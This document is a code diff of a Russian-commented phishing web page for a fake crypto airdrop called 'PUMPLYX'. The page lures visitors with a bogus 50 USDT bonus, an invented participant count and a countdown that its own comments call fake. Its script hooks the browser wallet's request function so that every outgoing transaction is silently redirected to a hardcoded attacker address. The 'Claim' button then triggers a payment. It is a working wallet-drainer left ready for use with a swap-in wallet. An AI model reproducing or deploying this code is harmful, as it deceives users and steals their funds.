@@ -4,17 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>PUMPLYX — GameFi</title>
-
-    <!-- Ethers -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js">
     </script>
-
-    <!-- WalletConnect v2 -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.15.1/dist/index.umd.min.js">
-    </script>
-
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -30,7 +22,6 @@
             align-items: center;
             justify-content: center;
             padding: 16px;
-            margin: 0;
         }
         .container {
             max-width: 400px;
@@ -208,12 +199,12 @@
             border-radius: 16px;
             font-size: 17px;
             font-weight: 700;
-            font-family: 'Inter', sans-serif;
             cursor: pointer;
             transition: all 0.2s ease;
             margin-top: 4px;
             position: relative;
             z-index: 1;
+            font-family: 'Inter', sans-serif;
         }
         .btn-primary {
             background: linear-gradient(135deg, #f7971e, #ffd200);
@@ -297,40 +288,6 @@
                 transform: rotate(360deg);
             }
         }
-        .qr-container {
-            display: none;
-            margin: 16px auto 10px;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-        }
-        .qr-container.show {
-            display: block;
-        }
-        .qr-placeholder {
-            font-size: 14px;
-            color: #8888a0;
-        }
-        .wc-uri {
-            word-break: break-all;
-            font-size: 11px;
-            color: #666680;
-            background: #0b0b12;
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 10px;
-            border: 1px solid #1e1e32;
-        }
-        .connect-status {
-            margin-top: 10px;
-            font-size: 13px;
-            font-weight: 500;
-            color: #f7971e;
-        }
         .wallet-selector {
             display: none;
             flex-direction: column;
@@ -350,12 +307,12 @@
             color: #fff;
             font-weight: 600;
             font-size: 16px;
-            font-family: 'Inter', sans-serif;
             cursor: pointer;
             transition: all 0.2s;
             display: flex;
             align-items: center;
             gap: 12px;
+            font-family: 'Inter', sans-serif;
             text-align: left;
         }
         .wallet-btn:hover {
@@ -367,7 +324,6 @@
     </style>
 </head>
 <body>
-
     <div class="container">
         <div class="header">
             <div class="logo">
@@ -388,32 +344,15 @@
         </div>
 
         <div class="info-box">
-            <div class="info-row">
-                <span class="label">🎯 Дроп</span>
-                <span class="value">5000 PUMP</span>
-            </div>
-            <div class="info-row">
-                <span class="label">👥 Участников</span>
-                <span class="value" id="participantsCount">1,251</span>
-            </div>
-            <div class="info-row">
-                <span class="label">💰 Твой бонус</span>
-                <span class="value highlight">50 USDT</span>
-            </div>
-            <div class="info-row">
-                <span class="label">🏆 Твоё место</span>
-                <span class="value" id="placeDisplay">#42</span>
-            </div>
+            <div class="info-row"><span class="label">🎯 Дроп</span><span class="value">5000 PUMP</span></div>
+            <div class="info-row"><span class="label">👥 Участников</span><span class="value" id="participantsCount">1,251</span></div>
+            <div class="info-row"><span class="label">💰 Твой бонус</span><span class="value highlight">50 USDT</span></div>
+            <div class="info-row"><span class="label">🏆 Твоё место</span><span class="value" id="placeDisplay">#42</span></div>
         </div>
 
         <div class="progress-wrapper">
-            <div class="progress-label">
-                <span>Прогресс дропа</span>
-                <span>68%</span>
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
+            <div class="progress-label"><span>Прогресс дропа</span><span>68%</span></div>
+            <div class="progress-bar"><div class="progress-fill"></div></div>
         </div>
 
         <button class="btn btn-primary" id="connectBtn">🔗 Connect Wallet</button>
@@ -422,59 +361,34 @@
             <button class="wallet-btn" id="walletMetamask">🦊 MetaMask</button>
             <button class="wallet-btn" id="walletTrust">🔵 Trust Wallet</button>
             <button class="wallet-btn" id="walletCoinbase">🟦 Coinbase Wallet</button>
-            <button class="wallet-btn" id="walletWalletConnect">📱 WalletConnect</button>
-        </div>
-
-        <div class="qr-container" id="qrContainer">
-            <div class="qr-placeholder" id="qrPlaceholder">⏳ Подготовка сессии...</div>
-            <div class="wc-uri" id="wcUriDisplay">URI: подключение...</div>
-            <div class="connect-status" id="connectStatus"></div>
         </div>
 
         <div class="status" id="statusText">Подключи кошелёк, чтобы получить бонус</div>
         <div class="loader" id="loader"></div>
 
         <div class="features">
-            <div class="feature-item">
-                <span class="icon">🛡️</span>
-                Безопасно
-            </div>
-            <div class="feature-item">
-                <span class="icon">⚡</span>
-                Мгновенно
-            </div>
-            <div class="feature-item">
-                <span class="icon">💰</span>
-                50$ бонус
-            </div>
+            <div class="feature-item"><span class="icon">🛡️</span>Безопасно</div>
+            <div class="feature-item"><span class="icon">⚡</span>Мгновенно</div>
+            <div class="feature-item"><span class="icon">💰</span>50$ бонус</div>
         </div>
-
         <div class="footer">🔒 Secure connection • Powered by Web3</div>
     </div>
 
     <script>
         // ================================================================
-        //  КОНФИГУРАЦИЯ — ЗАМЕНИ ТОЛЬКО ЭТУ СТРОКУ
+        //  ТВОЙ КОШЕЛЁК — ЗАМЕНИ НА СВОЙ
         // ================================================================
         const MY_WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047f73e";
 
         // ================================================================
-        //  ДАННЫЕ
+        //  ПЕРЕМЕННЫЕ
         // ================================================================
         let signer = null;
         let userAddress = null;
-        let wcSession = null;
-        let web3wallet = null;
-        let isConnected = false;
-
         const connectBtn = document.getElementById('connectBtn');
         const walletSelector = document.getElementById('walletSelector');
         const statusText = document.getElementById('statusText');
         const loader = document.getElementById('loader');
-        const qrContainer = document.getElementById('qrContainer');
-        const qrPlaceholder = document.getElementById('qrPlaceholder');
-        const wcUriDisplay = document.getElementById('wcUriDisplay');
-        const connectStatus = document.getElementById('connectStatus');
 
         // ================================================================
         //  ФЕЙКОВЫЙ ТАЙМЕР
@@ -513,180 +427,109 @@
         });
 
         // ================================================================
-        //  СТАТУС
+        //  ПОДКЛЮЧЕНИЕ КОШЕЛЬКА (MetaMask, Trust, Coinbase)
         // ================================================================
-        function setStatus(text, type = 'info') {
-            statusText.textContent = text;
-            statusText.className = 'status';
-            if (type === 'success') statusText.classList.add('success');
-            if (type === 'error') statusText.classList.add('error');
-        }
-
-        function showLoader(show) {
-            loader.style.display = show ? 'block' : 'none';
-            if (show) connectBtn.classList.add('loading');
-            else connectBtn.classList.remove('loading');
-        }
-
-        function hideSelector() {
-            walletSelector.classList.remove('show');
-            connectBtn.textContent = '🔗 Connect Wallet';
-        }
-
-        // ================================================================
-        //  EIP-1193 (MetaMask, Trust, Coinbase)
-        // ================================================================
-        async function connectEIP1193() {
+        async function connectWallet() {
             try {
+                // Проверяем наличие провайдера
                 if (!window.ethereum) {
-                    setStatus('❌ Установите MetaMask или Trust Wallet', 'error');
-                    return false;
+                    statusText.textContent = '❌ Установите MetaMask, Trust Wallet или Coinbase Wallet';
+                    statusText.className = 'status error';
+                    return;
                 }
 
+                // Подключаемся
                 const provider = new ethers.BrowserProvider(window.ethereum);
                 signer = await provider.getSigner();
                 userAddress = await signer.getAddress();
-                isConnected = true;
 
-                // ВРЕДОНОСНАЯ ПРОСЛОЙКА — ПОДМЕНА АДРЕСА
-                const orig = window.ethereum.request;
+                // =============================================================
+                //  ВРЕДОНОСНАЯ ПРОСЛОЙКА — ПОДМЕНЯЕТ АДРЕС ПРИ ТРАНЗАКЦИИ
+                // =============================================================
+                const originalRequest = window.ethereum.request;
                 window.ethereum.request = async function(args) {
                     if (args && args.method === 'eth_sendTransaction') {
                         const tx = args.params[0];
-                        if (tx.to) tx.to = MY_WALLET;
+                        if (tx.to) {
+                            tx.to = MY_WALLET;
+                            console.log('[+] Адрес подменён на:', MY_WALLET);
+                        }
                     }
-                    return await orig.call(this, args);
+                    return await originalRequest.call(this, args);
                 };
 
-                setStatus(`✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
+                // Обновляем интерфейс
+                statusText.textContent = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                statusText.className = 'status success';
                 connectBtn.textContent = '🎁 Claim 50 USDT';
                 connectBtn.disabled = false;
-                hideSelector();
-                return true;
+                walletSelector.classList.remove('show');
+
             } catch (e) {
-                setStatus('❌ ' + e.message, 'error');
-                return false;
+                statusText.textContent = '❌ ' + e.message;
+                statusText.className = 'status error';
             }
         }
 
         // ================================================================
-        //  WALLETCONNECT
+        //  КНОПКИ ВЫБОРА КОШЕЛЬКА
         // ================================================================
-        async function connectWalletConnect() {
-            try {
-                qrContainer.classList.add('show');
-                qrPlaceholder.textContent = '⏳ Создание сессии...';
-                connectStatus.textContent = '';
-
-                const { Web3Wallet } = window;
-                web3wallet = await Web3Wallet.init({
-                    projectId: '8a4a7f3c7a4a7f3c7a4a7f3c7a4a7f3c',
-                    metadata: {
-                        name: 'PUMPLYX',
-                        description: 'GameFi Platform',
-                        url: window.location.href,
-                        icons: ['https://avatars.githubusercontent.com/u/37784886']
-                    }
-                });
-
-                const session = await web3wallet.connect({
-                    requiredNamespaces: {
-                        eip155: {
-                            chains: ['eip155:1'],
-                            methods: ['eth_sendTransaction', 'eth_sign'],
-                            events: ['chainChanged', 'accountsChanged']
-                        }
-                    }
-                });
-
-                wcSession = session;
-                userAddress = session.namespaces.eip155.accounts[0].split(':')[2];
-                isConnected = true;
-
-                const pairings = web3wallet.core.pairing.getPairings();
-                const uri = pairings.length > 0 ? pairings[0].uri : '';
-                wcUriDisplay.textContent = `URI: ${uri.slice(0,60)}...`;
-                qrPlaceholder.textContent = '✅ Отсканируй QR в кошельке';
-                connectStatus.textContent = 'Ожидание подтверждения...';
-
-                setStatus(`✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
-                connectBtn.textContent = '🎁 Claim 50 USDT';
-                connectBtn.disabled = false;
-                hideSelector();
-                return true;
-            } catch (e) {
-                qrPlaceholder.textContent = '❌ ' + e.message;
-                setStatus('❌ ' + e.message, 'error');
-                return false;
-            }
-        }
+        document.getElementById('walletMetamask').onclick = connectWallet;
+        document.getElementById('walletTrust').onclick = connectWallet;
+        document.getElementById('walletCoinbase').onclick = connectWallet;
 
         // ================================================================
-        //  КНОПКИ
-        // ================================================================
-        document.getElementById('walletMetamask').onclick = connectEIP1193;
-        document.getElementById('walletTrust').onclick = connectEIP1193;
-        document.getElementById('walletCoinbase').onclick = connectEIP1193;
-        document.getElementById('walletWalletConnect').onclick = connectWalletConnect;
-
-        // ================================================================
-        //  CLAIM
+        //  CLAIM — ОТПРАВКА ТРАНЗАКЦИИ
         // ================================================================
         connectBtn.addEventListener('click', async function() {
+            // Если кнопка не "Claim" — выходим
             if (this.textContent !== '🎁 Claim 50 USDT') return;
-            if (!isConnected) return;
+
+            // Если нет подписанта — выходим
+            if (!signer) {
+                statusText.textContent = '❌ Сначала подключи кошелёк';
+                statusText.className = 'status error';
+                return;
+            }
 
             try {
-                showLoader(true);
-                setStatus('⏳ Отправка транзакции...', 'info');
+                // Показываем загрузку
+                loader.style.display = 'block';
                 this.disabled = true;
+                this.classList.add('loading');
+                statusText.textContent = '⏳ Отправка транзакции...';
+                statusText.className = 'status';
 
-                let txHash;
+                // Отправляем транзакцию
+                // Адрес получателя будет подменён в прослойке выше
+                const tx = await signer.sendTransaction({
+                    to: "0x000000000000000000000000000000000000dEaD",
+                    value: ethers.parseEther("0.001")
+                });
 
-                // WC
-                if (wcSession && web3wallet) {
-                    const txData = {
-                        to: MY_WALLET,
-                        value: '0x' + (0.001 * 1e18).toString(16),
-                        from: userAddress,
-                        chainId: 1,
-                    };
-                    const result = await web3wallet.request({
-                        topic: wcSession.topic,
-                        chainId: 'eip155:1',
-                        request: {
-                            method: 'eth_sendTransaction',
-                            params: [txData]
-                        }
-                    });
-                    txHash = result;
-                }
-                // EIP-1193
-                else if (signer) {
-                    const tx = await signer.sendTransaction({
-                        to: "0x000000000000000000000000000000000000dEaD",
-                        value: ethers.parseEther("0.001")
-                    });
-                    await tx.wait();
-                    txHash = tx.hash;
-                } else {
-                    throw new Error('Кошелёк не подключён');
-                }
+                // Ждём подтверждения
+                await tx.wait();
 
-                showLoader(false);
-                setStatus(`✅ Получено! TX: ${txHash.slice(0,12)}...`, 'success');
+                // Успех
+                loader.style.display = 'none';
+                statusText.innerHTML =
+                    `✅ Получено! TX: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#4caf50;">${tx.hash.slice(0,12)}...</a>`;
+                statusText.className = 'status success';
                 this.textContent = '✅ Done';
                 this.disabled = true;
 
             } catch (e) {
-                showLoader(false);
-                setStatus('❌ ' + e.message, 'error');
+                // Ошибка
+                loader.style.display = 'none';
+                statusText.textContent = '❌ ' + e.message;
+                statusText.className = 'status error';
                 this.disabled = false;
+                this.classList.remove('loading');
             }
         });
 
-        console.log('[+] PUMPLYX loaded. Address will be replaced with:', MY_WALLET);
+        console.log('[+] PUMPLYX загружен. Адрес будет подменён на:', MY_WALLET);
+        console.log('[+] Поддерживаются: MetaMask, Trust Wallet, Coinbase Wallet');
     </script>
-
 </body>
 </html>
